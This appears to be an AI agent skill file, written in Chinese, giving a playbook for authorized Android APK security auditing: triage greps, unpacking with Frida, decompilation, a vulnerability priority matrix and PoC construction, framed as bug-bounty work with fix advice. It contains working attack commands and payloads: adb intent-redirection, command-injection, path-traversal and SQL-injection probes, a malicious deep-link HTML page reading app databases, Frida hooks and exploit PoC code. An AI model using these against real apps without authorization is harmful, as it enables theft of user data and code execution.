---
name: android-apk-hunt
description: "Android APK 一体化狩猎：零预处理快筛（Manifest 组件面秒读/密钥·签名·接口关键词矩阵/按需单类反编译，大包先筛后反编译）→ 壳识别与脱壳（Frida dump/在线/非root）→ JADX+apktool 全量反编译与 so/H5/assets 标准产物 → 组件深挖优先级矩阵（P0 硬编码密钥追踪→未授权接口、P1 Intent 重定向、P2 命令注入、P3 Deep Link→WebView 注入、P4 ContentProvider 路径遍历）→ 无 Frida/无 Root 验证与 PoC 构建。含厂商 SRC 忽略清单与分流。仅授权测试使用。"
version: 1.1.0
author: "hack-auditor (CK-Fusion T2, 2026-11-09; v1.1.0 增量吸收 FreeBuf 511240《AI 加持 Android 逆向》, gap-20261107-002)"
license: "MIT (source repo) / internal (本机适配)"
routing:
  phase: [recon, enum, exploit]
  target_type: [mobile, binary]
  technologies: [android, apk, dex, jni, so, webview, frida]
  vuln_hints: [hardcoded-credentials, unauth, intent-redirection, command-injection, deeplink, path-traversal, xss]
  task_types: [audit, exploit, reverse]
is_broad_knowledge: false
aliases: [apk审计, android安全审计, APK脱壳, 安卓逆向, 壳识别, 快筛, 密钥追踪, android-security-audit, apk-reversing, asc-fast-hunt]
metadata:
  hermes:
    tags: [android, apk, jadx, apktool, unpacking, dex, manifest, jsbridge, deeplink, contentprovider, src-hunt]
    source: "融合自 zhaji2333/CkSKILLS (MIT, 2026-11-09) 三源收缩合并：asc-fast-hunt(322行)+apk-reversing(219行)+android-security-audit(989行)→本文件"
    related_skills: [miniprogram-security, wih-secret-hunter, js-api-reverse, supply-chain-security, redteam-auth, rea-reverse-engineering, hunt-clueboard, src-report-gate, fp-check, scope-gate, poc-evidence-snapshot]
---

# android-apk-hunt — APK 快筛·脱壳·组件深挖一体化狩猎

> 融合自 zhaji2333/CkSKILLS (MIT, 2026-11-09)，**三源合并**：asc-fast-hunt（322 行，快筛/大包纪律）+ apk-reversing（219 行，壳识别/脱壳/标准产物）+ android-security-audit（989 行，组件优先级矩阵/无 Frida 验证/PoC/忽略清单）→ 收缩为本文件。原三技能互链在此自引用消解（源 repo 快照：`/Users/YOURNAME/.hermes/shared/research/20261109-ck-skills-hack-fusion/ckskills-repo/.agents/skills/`）。
>
> 本机适配（2026-11-09 实测）：jadx 1.5.6 / apktool / adb / frida / r2 已装（`which` 先行确认）；frida-dexdump、Droid ASC 未装——替代路径见各节；SO 层二进制分析走本机 REA MCP（`mcp__rea__*` 系列，Ghidra 12.2 后端）。
>
> **红线：仅授权测试。** 动手前过 `scope-gate` 授权门；在线脱壳平台上传前确认目标已授权。证据纪律：不编造代码/类名/路径，字符串命中 ≠ 证明执行，每个发现标漏洞类型/证据（file:line）/向量（远程/本地）/评级依据；误报复核走 `fp-check`。

## 触发条件

- 拿到 APK 需要系统化审计（快筛 → 脱壳 → 组件深挖 → 验证 → PoC）
- APK > 100MB 全量反编译成本过高，或脱壳产物（裸 dex）需快速检索
- JADX 打开是 stub/空壳、入口类 `com.stub.StubApp`、`lib/` 下只有壳 so
- 目标是预装/厂商系统应用（HyperOS/MIUI/工程模式/OTA/诊断工具）
- 发现导出组件、Intent 重定向、WebView/JSBridge、Deep Link、ContentProvider、硬编码密钥可疑点
- 需要无 Root / 无 Frida 环境完成验证与 PoC

## 工具自检（开工 10 秒）

```bash
which jadx apktool adb frida r2 strings unzip   # 前 5 个本机已装（/opt/homebrew/bin）
jadx --version                                  # 1.5.6，支持 --single-class
pip3 show frida-dexdump 2>/dev/null || echo "未装：pip3 install frida-dexdump"   # 脱壳时才需要
```

## 快速导航

| 任务 | 章节 |
|---|---|
| 大包/任意包零预处理**快筛** | → 一 |
| **壳识别与脱壳** | → 二 |
| 全量反编译与标准产物（so/H5 走 REA） | → 三 |
| **组件优先级矩阵**（密钥追踪/Intent/命令注入/DeepLink/Provider） | → 四 |
| **无Frida验证** + PoC 构建 | → 五 |
| 忽略清单与分流 / 修复建议 | → 六 / 七 |

---

## 一、快筛：零预处理三步（源 asc-fast-hunt）

**顺序纪律（先筛后反编译）**：
- 小包（<20MB）：直接 §三 全量反编译，快筛无收益
- 大包（>100MB）：必先快筛确认值得深挖再付全量成本（源技能实测对照：68MB 包 JADX 全量 39.2s/6.96GB 内存 vs ASC 快筛 0.34s/108MB）
- 壳包：DEX 里只有 stub，快筛搜不到东西是**正常现象**，不要误判为「没有密钥」→ 先走 §二 脱壳

### Step 1：Manifest 秒读组件面

```bash
apktool d --no-src -f target.apk -o fast_out        # 只解资源不解码 dex，秒~分钟级
grep -B3 -A8 'exported="true"' fast_out/AndroidManifest.xml                  # 导出组件
grep -oE 'android:scheme="[^"]+"' fast_out/AndroidManifest.xml | sort -u      # Deep Link scheme
grep -oE 'android:name="android.permission.[^"]+"' fast_out/AndroidManifest.xml | sort -u  # 权限面
grep -iE 'android:process|sharedUserId|allowBackup|debuggable|taskAffinity' fast_out/AndroidManifest.xml
cat fast_out/res/xml/file_paths.xml 2>/dev/null      # FileProvider 路径暴露（root-path/external-path 过度暴露→P4）
```

产出：导出 Activity/Service/Receiver/Provider 清单 + scheme 清单 → 交 §四 组件深挖。

### Step 2：密钥·签名·接口关键词 grep 矩阵

dex 字符串池是明文，`strings` 秒级判断「有没有」，但不能定位类（定位走 Step 3）：

```bash
mkdir -p dexdir && (cd dexdir && unzip -o ../target.apk 'classes*.dex')
# A 组｜凭证密钥  B 组｜签名加密  C 组｜网络接口  D 组｜后门调试  E 组｜云服务第三方
for kw in appkey app_secret secret_key access_key api_key client_secret \
          sign signature signKey hmac RSA AES \
          "https://" "/api/" "/v1/" Authorization Bearer userToken \
          debug backdoor admin bypass __dev__ mock \
          appId accessKeyId endpoint bucket; do
  echo "### $kw"; strings dexdir/classes*.dex | grep -iF -- "$kw" | sort -u | head -20
done
```

- 命中收敛不了 → 换更长特征串（`app_secret`、`client_secret`）或加限定词
- **URL 类命中最有价值**：接口域名/路径清单 → `wih-secret-hunter`/`js-api-reverse` 资产测绘与接口测试
- 否定证据同样入板（「搜 appkey 无硬编码命中，疑为动态下发」）→ `hunt-clueboard`

### Step 3：按需反编译单个类

```bash
jadx --single-class com.x.SignUtil target.apk        # 单类秒出，类名来自 Step 1/2 线索
jadx --single-class com.x.SignUtil dexdir/classes2.dex   # 对脱壳 dex 同样适用
```

读的时候盯四件事：① 加密调用（`MessageDigest.getInstance("MD5")`、`Cipher.getInstance("AES/...")`）；② 拼接顺序（`md5(appId+appKey+ts)` → 直接决定能否 Python 重写）；③ 常量来源（硬编码 / SharedPreferences / native→转 SO 层）；④ 参数是否疑似外部可控（确认可达性必须回全量 JADX 产物——快筛输出不用于数据流推理与报告取证）。

### Droid ASC 路径（可选加速，本机未装）

源技能基于 [MG1937/ASC](https://github.com/MG1937/ASC)（Droid ASC，Black Hat Europe Arsenal）：`asc_manifest`（0.3s 全量 Manifest）、`asc findrefs`（跨全部 dex 分片搜 string/type/method/field 引用点，115 倍快于全量）、`asc getclass`（单类 0.12s）。**未装则走上文 JADX 快筛替代路径**；如需重建：`git clone --depth 1 https://github.com/MG1937/ASC && cd ASC && python3.11 -m venv .venv && ./.venv/bin/pip install androguard==4.1.4 loguru`（Python ≥3.11 硬门槛，本机 `/Users/YOURNAME/.local/bin/python3.11`）。注意：原仓库无 LICENSE，仅限本机自用与授权测试，不得对外分发；DAD 后端类型不可信（实测 ByteBuffer 被声明为 String），数据流推理/取证截图一律用 JADX 产物。

---

## 二、壳识别与脱壳（源 apk-reversing）

### 2.1 壳识别（先识别再脱壳）

```bash
unzip -l target.apk | grep -iE "libshella|libjiagu|libSecShell|libexec|libtprt|libchaosvmp|libddog|com/stub"
grep -oE 'android:name="[A-Za-z0-9._]*Application[A-Za-z0-9._]*"' fast_out/AndroidManifest.xml
```

| 加固 | 特征（lib/入口类） | 脱壳方式 |
|---|---|---|
| 腾讯乐固 | `libshella-*.so` / `libtprt.so` / `com.stub.StubApp` | frida-dexdump / 模拟器运行 dump |
| 梆梆 | `libSecShell.so` / `SecShell` | frida-dexdump / 反射大师 |
| 爱加密 | `libexec.so` / `libexecmain.so` / `com.secneo.apkwrapper` | frida-dexdump |
| 360 | `libjiagu.so` / `libjiagu_x86.so` | 360 脱壳 / 反射大师 |
| 娜迦/顶象 | `libchaosvmp.so` / `libddog.so` | 内存 dump + dex 修复 |
| 腾讯御安全等 | `libtosprotection.so` 等 | frida-dexdump / 运行 dump |
| DCloud uni-app | 无壳 so，`assets/apps/<appid>/www/` | **无需脱壳**，www/ 即前端源码 |

判定：JADX 打开全是 stub 包装类 = 有壳必须脱壳；能直接看到业务类 = 无壳，跳到 §三。

### 2.2 脱壳（核心：App 启动后 dex 才在内存解密，必须先运行再 dump）

```bash
# 方式 1｜模拟器 + Frida dump（最通用；root 模拟器 MuMu/夜神/雷电 + 架构匹配的 frida-server）
adb push frida-server /data/local/tmp/ && adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"
adb install target.apk && adb shell monkey -p <package> 1        # 启动 App
frida-dexdump -U -f <package> -o dex/                            # 本机 frida 已装，dexdump 见工具自检
# 多 dex 分片合并后统一交 JADX；dump 的 dex 头部可能损坏 → dexfixer 类工具修复
```

- 方式 2｜在线脱壳服务：适合简单壳，**仅限已授权目标**，注意上传合规
- 方式 3｜非 root：`adb backup -f app.ab <package>`（API ≤23 适用），或换 root 模拟器
- 方式 4｜H5/uni-app：`unzip -o target.apk -d apktool_out && ls apktool_out/assets/apps/*/www/` 直接是前端源码；微信小程序内嵌 → `miniprogram-security`
- 裸 dex 不能直接喂部分工具（只认 zip 容器）：`cd dexdir && zip -q dumped.zip classes*.dex && cp dumped.zip dumped.zip.apk`

### 2.3 手动兜底：DexClassLoader hook + `dex\n035` 内存扫描（frida-dexdump 不可用/壳变体失效时）

原理锚点（FreeBuf 511240）：壳最终必须把解密后的 DEX 交给虚拟机执行，运行时内存中一定出现可识别的 DEX 结构（magic `dex\n035`~`039`）。工具化路径失败时按此手写兜底：

```js
// 观察壳把 dex 落到哪/如何加载（先跑通观察，再决定 dump 点）
Java.perform(function () {
  var CL = Java.use("dalvik.system.DexClassLoader");   // 或 BaseDexClassLoader / InMemoryDexClassLoader
  CL.$init.overload("java.lang.String","java.lang.String","java.lang.String","java.lang.ClassLoader")
    .implementation = function (dexPath, optDir, libPath, parent) {
      console.log("[DEX] " + dexPath + " | opt=" + optDir);
      return this.$init(dexPath, optDir, libPath, parent);
    };
});
```

- 兜底顺序：先观察 dexPath（很多时候直接从 optDir 拉文件即可）→ 不落盘壳再扫内存 `dex\n035` magic 定位边界按 DEX 格式写文件 → dump 后校验 header（magic/map_off/string_ids）修复再进 JADX，对比脱壳前后类数/方法数确认完整。
- 备选工具名：BlackDex（免 root 免 Frida，脱壳一体）、FART（主动调用链脱壳，对抗抽取壳）、FDex2（老牌 hook dump）。仅授权目标使用；dump 失败如实记录未还原项进 report.md，不硬凑。

---

## 三、全量反编译与标准产物（源 apk-reversing）

### 3.1 命令与产物目录

```bash
jadx -d jadx_out --show-bad-code target.apk     # 无壳直接反编译 APK；有壳反编译脱壳后的 dex 目录
apktool d target.apk -o apktool_out             # Manifest / smali / 资源 / lib
cp -r apktool_out/lib lib/ && cp -r apktool_out/assets assets/
```

```
reversing/<package>/
├── jadx_out/          # Java 源码（必须是真实代码而非 stub）
├── apktool_out/       # smali + 资源 + AndroidManifest
├── dex/               # 脱壳后 dex（未合并时单独留档）
├── lib/               # 全部 so（arm64-v8a 优先）
├── assets/            # H5/JS/证书/密钥/配置
├── origin.apk         # 原始 APK 存档
└── report.md          # 壳类型/脱壳方式/产物清单/未还原项（如实记录）
```

**交付检查**：`jadx_out` 能 grep 到真实特征串（appKey/secret/接口域名）；`lib/` so 可被 REA/r2 打开搜导出表；assets H5 完整；入口类是业务代码非 stub；多分片 dex 已合并；report.md 已写。

### 3.2 SO 层 → 本机 REA MCP（Ghidra 12.2 后端）

```
mcp__rea__open_binary(lib/arm64-v8a/libxxx.so)
  → mcp__rea__binary_overview / mcp__rea__inspect_native_exports   # 搜 Java_ 前缀（静态注册）/ JNI_OnLoad+RegisterNatives（动态注册）
  → mcp__rea__procedure_pseudo_code                                 # 伪 C：认算法（MD5/SHA/AES）与拼接顺序 → Python 重写
  → mcp__rea__search_strings / mcp__rea__list_strings               # 硬编码密钥/常量
  → mcp__rea__find_xrefs_to_name                                    # RegisterNatives 交叉引用
动态兜底（仅取证）：mcp__rea__start_frida_session → mcp__rea__instrument_with_frida（Hook 入参出参）
降级路径：r2 -A libxxx.so（izz 字符串 / afl 函数 / pdf 反汇编）
```

优先顺序：① REA 纯静态（无需设备，主路径）→ ② 模拟器抓包截明文（无 root 可做，与伪 C 对比验证签名细节）→ ③ Frida Hook（仅静态读不动时：ollivm/VMP/字符串加密；底线 Hook `SSL_write`/`send` 截最终 HTTP 明文）→ ④ Unidbg 模拟执行（算法重度魔改、Python 重写失败时：so 挂 Unicorn 模拟跑 JNI 函数，多组样本比对 I/O 验证；生态条目见 `reverse-ecosystem-index` "unidbg"）。

算法判定纪律（FreeBuf 511240）：加密常量命中（MD5/SHA1/SHA256 初始向量、AES S-Box）**只能作线索不能作结论**——常量表可被复用混淆；最终以多组真实输入输出比对一致为准。

最小 Hook 模板（Java 层签名函数取证，定位到 `getSign` 类方法后直接改类名/方法签名用）：

```js
Java.perform(function () {
  var T = Java.use("com.example.app.security.SignHelper");
  T.getSign.overload("java.lang.String").implementation = function (input) {
    var ret = this.getSign(input);
    console.log("[HOOK] in=" + input + " out=" + ret);
    console.log("[STACK] " + Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Exception").$new()));
    return ret;
  };
});
```

配合 Python 复现脚本比对（HMAC-SHA256 例）：`raw = f"{ts}{deviceId}{path}{body}"` → `hmac.new(secret, raw, sha256).hexdigest()`，与真实请求 sign 一致才算还原成立；不一致回 Frida/Native 层核对输入拼序。

### 3.3 H5/JS 层

- `assets/` 提取 HTML/JS，搜加密库（`JSEncrypt`、`CryptoJS`）与密钥常量；远程加载的 H5 记录 URL
- 远程调试：`chrome://inspect` 连 WebView 前端断点，内存中看加密函数入参与密钥
- RSA 公钥只做传输混淆不是鉴权：拿到公钥即可构造合法密文，接口无登录校验 = 未授权数据泄露

---

## 四、组件深挖优先级矩阵（源 android-security-audit）

每个导出组件都要回答：能否被外部触发（exported？权限保护？来源校验？）→ 参数可控 → 流向敏感操作（startActivity/exec/文件/数据库/UI 渲染）。

### P0｜硬编码密钥追踪 → 未授权接口（最高优先级）

**攻击链一句话**：拿 1 个公开 uid/ID → 反编译提取 appId/appKey/签名密钥（DEX/SO/H5 三层）→ 还原 sign 拼接（`md5(appId+appKey+ts)`）→ 直接 POST 业务接口 → 未授权批量拉数据。服务端只验签名不验会话 = 伪鉴权。

| 层 | 场景 | 手段 |
|---|---|---|
| DEX | 核心算法在 Java 层 | `grep -rniE "appKey|appSecret|secret|sign|signature|md5|encrypt|aes|rsa" jadx_out/sources/` → 追调用链 → Python 重写 |
| SO | `System.loadLibrary` + native 方法 | §三.2 REA 静态 → 抓包兜底 → Frida 最后（仅取证） |
| H5/JS | WebView 动态加载远程 H5 | §三.3 assets 提取 / chrome://inspect |

**案例模板（聊天记录泄露链，匿名化）**：公开 uid → 提取硬编码 appId/appKey → `sign=md5(appId+appKey+ts)` → `POST /api/chat/sessions {"userId":<uid>}` 列全部会话 → `POST /api/chat/history` 拿消息正文 → Base64 解码 = 任意用户聊天记录未授权读取。

**Frida 边界（强制）**：Frida 仅作密钥/签名取证工具；最终 PoC 用提取的密钥直接构造签名请求（Python/curl），不依赖 Frida；报告口径写「密钥硬编码于客户端 + 接口仅验签名未验会话/未鉴权」，全程不写 Frida。

### P1｜Intent 重定向（LaunchAnywhere，高危）

```bash
grep -rn "getParcelableExtra.*Intent\|startActivity.*getParcelable" jadx_out/sources/
adb shell am start -n com.victim/.ExportedActivity --es redirect_intent "com.victim/.PrivateActivity"
```

exported 组件 `getParcelableExtra` 返回 Intent 后 `startActivity/startService/sendBroadcast` → 以受害 App 身份启动任意未导出组件（成功启动未导出 Activity=高危；仅自身导出组件=忽略）。同族：`PendingIntent` 空 Intent 未设 `FLAG_IMMUTABLE`；隐式 Intent 未 `setPackage()` 可被拦截；UI 内容注入（`setTitle/setMessage/setText(getIntent()...)`，系统级 App 弹窗欺骗=中危）。

### P2｜命令注入（高危~严重）

```bash
grep -rn "Runtime.getRuntime\|ProcessBuilder\|\"su\|ShellUtils\|CommandUtils\|RootCmd\|\.exec(" jadx_out/sources/
adb shell am start -n com.victim/.VulnActivity --es command "id" && adb logcat | grep "uid="
```

`exec(String)` 经 shell 解析可注入 `;`/`|`/`&&`；`exec("cat "+filename)` 拼接即注入；`su -c` 参数外部可控 = root 任意命令（严重）。厂商工具类 App（工程模式 EngineerMode/诊断 CIT/OTA）是重点；追踪 ShellUtils 类多组件共用调用链；JSBridge 方法调 exec + WebView URL 注入 = **远程 RCE（严重）**。

### P3｜Deep Link → WebView 注入链（远程可达，评级更高）

```bash
grep -rn "loadUrl.*getData\|getIntent().getData\|getQueryParameter" jadx_out/sources/
adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=file:///data/data/com.victim/databases/private.db"
```

典型链：`myapp://webview?url=<attacker>` → 取 url 参数 → `webView.loadUrl(url)`。远程读沙箱文件/加载任意 URL=高危；Deep Link 参数构造 Intent 启动未导出组件=高危；本地触发内部功能=中危。叠加 WebView 配置面（`setAllowFileAccessFromFileURLs(true)`/`setAllowUniversalAccessFromFileURLs(true)`/`addJavascriptInterface` targetSdk<17=RCE/`onReceivedSslError` 无条件 proceed）与 JSBridge（自定义 scheme `jsbridge://` 拦截、`@JavascriptInterface` 方法参数进文件/SQL/Intent 操作、JSBridge 回传文件内容 = 远程读沙箱文件）。

### P4｜ContentProvider 路径遍历与注入（高危）

```bash
grep -rn "openFile\|openAssetFile\|ParcelFileDescriptor.open\|rawQuery" jadx_out/sources/
adb shell content read --uri "content://com.victim.provider/../../../data/data/com.victim/databases/private.db"
adb shell content query --uri content://com.victim.provider/users --where "name='test' OR 1=1--"
```

`openFile` 不滤 `../` = 沙箱任意文件读取（高危）；`query/delete` 的 selection 拼接 = SQL 注入；FileProvider `file_paths.xml` 过度暴露（§一 Step 1 已提）。同族：`ZipInputStream` 不校验 `../` = Zip Slip 覆写（高危）；剪贴板写密码/token（中危）。

### P5｜次级面 grep 速查表

| 面 | grep 特征 | 判定要点 |
|---|---|---|
| 证书校验绕过 | `X509TrustManager\|checkServerTrusted\|HostnameVerifier` | 空实现/恒 true=中危 |
| 系统功能滥用 | `Settings.Secure.putString\|enabled_accessibility_services\|PackageInstaller` | 外部可触发开无障碍=高危；静默安装=严重 |
| Binder 系统服务 | `ServiceManager.addService\|checkCallingPermission\|onBind` | 自定义服务无调用方校验=高危~严重；提 AIDL 构建 PoC（§五） |
| 广播 | `sendOrderedBroadcast\|registerReceiver\|sendStickyBroadcast` | 无权限保护可劫持/注入=中低危 |
| Fragment 注入 | `Fragment.instantiate\|isValidFragment` | className 外部可控=中危 |
| 敏感存储/日志 | `MODE_WORLD_READABLE\|getExternalStorageDirectory\|Log\.[dvi]` | 其他 App 可读=中危；logcat 敏感信息=低危 |
| SSRF | `HttpURLConnection\|OkHttpClient` × `getIntent\|getQueryParam` | 可指向 127.0.0.1/169.254.169.254=中高危 |
| 权限合规越权 | `getImei\|getSubscriberId\|RoleManager\|NotificationChannel\|IMPORTANCE_HIGH` | 名实不符双结论分流（§六） |

---

## 五、无 Frida/无 Root 验证 + PoC 要点（源 android-security-audit 三/四）

**验证原则**：发现即验证，**远程优先**（评级更高），失败再本地。ADB/PoC App/恶意 HTML 均为合法验证手段；禁止把「依赖 Root/Frida」写成漏洞本身。

### 5.1 远程验证（优先级 1）：恶意 HTML

```html
<!-- deeplink_poc.html：发到目标手机浏览器打开即可，无需安装任何 App -->
<a href="myapp://path?param=payload">点击触发</a>
<script>location.href = "myapp://webview?url=file:///data/data/com.victim/databases/private.db";</script>
```

### 5.2 本地验证（优先级 2）：ADB 命令集

```bash
adb shell am start -n com.victim/.ExportedActivity --es key value --ei intKey 1   # 导出 Activity
adb shell am startservice -n com.victim/.ExportedService                          # 导出 Service
adb shell am broadcast -a com.victim.ACTION --ei state 3                          # 广播
adb shell content query --uri content://com.victim.provider/path                  # Provider 查询
```

**纯 ADB 验证的漏洞评级不高于「本地」级**；可被恶意 App 利用的务必补 PoC App 争取更高评级。

### 5.3 PoC App 三模板（骨架）

工程配置：AGP 8.2+ / Gradle 8.6 / Java 21 / minSdk 21 / targetSdk 34；`local.properties` 指定 `sdk.dir`，`android.useAndroidX=true`。

```java
// ① Intent 重定向：wrapper(exported) 内嵌 malicious(未导出) 经 Parcelable extra 传递后 startActivity
Intent malicious = new Intent(); malicious.setComponent(new ComponentName("com.victim","com.victim.PrivateActivity"));
Intent wrapper = new Intent(); wrapper.setComponent(new ComponentName("com.victim","com.victim.ExportedActivity"));
wrapper.putExtra("redirect_intent", malicious); startActivity(wrapper);
// ② Binder 服务调用：从受害 App 提取 AIDL 到 app/src/main/aidl/ → bindService 后
ICustomService.Stub.asInterface(service).getSensitiveData();     // onServiceConnected 内逐方法调用
```

```html
<!-- ③ JSBridge 注入：window.jsInterface.readFile("/data/data/com.victim/databases/private.db")
     或 location.href = "jsbridge://readFile?path=/data/.../private.db" -->
```

### 5.4 证据纪律

- 密钥链取证三件套：JADX 定位硬编码密钥（截图+路径）→ 签名逻辑 Python 重写 → 未授权请求返回**他人/全量**真实数据（请求块+响应截图）
- 字符串匹配 ≠ 证明执行：grep 命中后必须沿调用链确认参数可达与校验缺失
- 组合链思维：Deep Link → WebView → JSBridge → 命令执行/文件读取，不要停在单点
- 跨轮线索与证据快照：`hunt-clueboard`（`reports/<TARGET_SLUG>/CLUEBOARD.md`）+ `poc-evidence-snapshot`

---

## 六、忽略清单与分流（厂商 SRC 口径，压缩）

**忽略不报**：缺证书绑定；缺混淆/可重打包/缺二进制保护；allowBackup=True；APK 含硬编码密钥**本身**（要报的是密钥→未授权接口链）；私有目录保护的数据；畸形 Intent 仅致崩溃可重启的本地 DoS；已获权限范围内取数；依赖 Root/Frida 的「漏洞」；低欺骗性钓鱼；无法复现的报告；利用条件极苛刻。

**优先报告**：远程可达（无需装 PoC App）；可获 root/system 权限；可读沙箱任意文件；可执行任意代码；系统级 App 漏洞（安全中心/设置/权限管理器）。
**次要报告**：需用户交互；仅特定机型/版本；本地可达但危害有限。
**合规越权分流**（不忽略也不按高危计分）：权限申请名实不符、推送分类伪造/白名单滥用/VoIP 误用——输出「安全影响 + 合规风险」双结论。

## 七、修复建议速查

组件最小暴露（无需求一律 `exported="false"`，导出加 signature 级权限）；`callingPackage` 白名单校验；PendingIntent `FLAG_IMMUTABLE`；隐式 Intent `setPackage()`；WebView 关 file 访问 + JSBridge 方法白名单 + 生产关调试；Provider 校验 URI/selection、`file_paths.xml` 最小暴露、解压防 `../`；Binder 每方法 `checkCallingPermission()`；外部输入禁入 `Runtime.exec`/`su -c`；密钥不出客户端、接口验会话不只验签名；严格 TrustManager + 证书固定 + `network_security_config.xml`（native 层同样）。

## 八、参考资源（不搬运，读源 repo 快照）

android-security-audit 的 10 个中文 Android 参考文档未随技能搬运（体积控制），按需读快照：
`/Users/YOURNAME/.hermes/shared/research/20261109-ck-skills-hack-fusion/ckskills-repo/.agents/skills/android-security-audit/resources/`
（Android平台概览/数据存储/网络通讯/加密API/平台API/本地认证/篡改和逆向工程/反逆向防御/代码质量和构建设置/基础安全测试.md）

---

## 联动

- 接口域名/资产测绘 → `wih-secret-hunter`、`js-api-reverse`；鉴权/Token → `redteam-auth`
- 云凭证（AK/SK/bucket）→ `supply-chain-security`
- SO 层深度逆向 / REAP 提示词 → `rea-reverse-engineering`（本技能 §三.2 已给 REA MCP 调用序列）
- 内嵌小程序/H5 → `miniprogram-security`；跨轮线索 → `hunt-clueboard`
- 误报复核 → `fp-check`；证据快照 → `poc-evidence-snapshot`；正式报告 → `src-report-gate`
